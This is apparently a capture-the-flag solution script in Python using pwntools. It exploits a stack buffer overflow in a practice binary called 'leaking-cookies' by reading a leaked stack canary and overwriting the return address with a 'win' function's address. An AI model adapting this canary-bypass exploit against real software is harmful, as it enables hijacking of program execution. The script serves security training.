from pwn import *

if __name__ == "__main__":
    context.log_level = "error"
    # io = process("./leaking-cookies")
    io = remote("chal.ctf-league.osusec.org", 1335)

    # grab provided info
    provided_addrs = io.recvlineS()

    # stack cookie is third to last hex value
    cookie_str = provided_addrs.split()[-3]

    # the hex number we're given is actually reversed due to endianness
    cookie = bytes.fromhex(cookie_str[2:])[::-1]

    # get win function address :)
    exe = ELF("./leaking-cookies")
    win_addr = exe.symbols["win"]

    # construct and send payload
    # overflow + cookie + garbage base pointer + overwritten return address
    payload = b"A" * 24 + cookie + p64(0xDEADBEEF) + p64(win_addr)
    io.sendline(payload)

    # profit :)
    print(io.recvuntil(b"}").decode())
